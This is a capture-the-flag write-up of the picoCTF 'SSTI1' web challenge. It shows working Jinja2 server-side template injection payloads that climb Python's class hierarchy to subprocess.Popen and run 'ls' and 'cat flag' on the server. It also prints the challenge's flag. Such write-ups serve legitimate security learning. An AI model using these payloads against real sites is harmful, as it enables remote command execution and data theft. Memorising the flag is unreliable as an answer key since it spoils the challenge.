### SSTI1

### **Writeup - SSTI1 (Server-Side Template Injection) 🚀**

### **📌 Challenge Name:** SSTI1

### **📌 Category:** Web Exploitation

### **📌 Description:**

> "I made a cool website where you can announce whatever you want! Try it out!"
> 

🔹 The challenge hint suggests **Server-Side Template Injection (SSTI)** vulnerability.

🔹 The goal is to **exploit SSTI** to gain access to sensitive files and retrieve the **flag**.

---

## **🔍 Step 1: Identifying SSTI Vulnerability**

To check if the website is vulnerable to SSTI, I tested the following payload:

```
{{7*7}}

```

✅ **Result:** `49`

➡ This confirms that the website **executes template expressions**, indicating an SSTI vulnerability.

---

## **🔍 Step 2: Identifying the Template Engine**

To determine which template engine is being used, I injected:

```
{{ config }}

```

✅ **Result:** A Flask configuration dictionary appeared, confirming the use of **Jinja2 (Python)**.

---

## **🔥 Step 3: Exploring Available Objects**

Since Jinja2 allows access to Python objects, I tried to enumerate them:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}

```

✅ **Result:** A long list of available classes, including **subprocess.Popen**, which allows command execution.

📌 **Goal:** Find the index of `subprocess.Popen` to execute system commands.

---

## **🚀 Step 4: Finding `subprocess.Popen` Index**

By iterating through the list, I located `subprocess.Popen` at index `356`:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356] }}

```

✅ **Result:**

```
<class 'subprocess.Popen'>

```

📌 Now, I can **execute commands on the server!**

---

## **🔥 Step 5: Listing Files on the Server**

Using `subprocess.Popen`, I executed the `ls` command to check the available files:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate() }}

```

✅ **Result:**

```
(b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)

```

📌 The **`flag`** file is present!

---

## **🚀 Step 6: Reading the Flag File**

Now, I used the `cat` command to read the contents of `flag`:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate() }}

```

✅ **Result:**

```
(b'picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}', None)

```

🎉 **Flag Found!**

---

## **🏆 Final Flag**

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}

